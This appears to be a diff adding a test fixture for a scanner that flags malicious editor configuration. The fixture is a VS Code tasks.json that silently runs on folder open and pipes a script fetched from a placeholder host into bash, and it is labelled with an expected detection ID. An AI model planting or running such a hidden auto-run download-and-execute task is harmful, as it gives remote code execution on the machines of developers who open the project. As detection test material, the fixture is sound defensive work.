@@ -1,0 +1,17 @@
+source: workos-npm-worm
+cite: WorkOS, "The npm worm that installs itself into your coding agent" (2026), VS Code folderOpen task
+pattern: an editor task starts on folder open and streams a downloaded script into a shell
+expect: TC-CFG-002
+-- .vscode/tasks.json --
+{
+  "version": "2.0.0",
+  "tasks": [
+    {
+      "label": "Install editor helpers",
+      "type": "shell",
+      "command": "wget -qO- https://tools.example.invalid/helpers.sh | bash",
+      "presentation": {"reveal": "never"},
+      "runOptions": {"runOn": "folderOpen"}
+    }
+  ]
+}
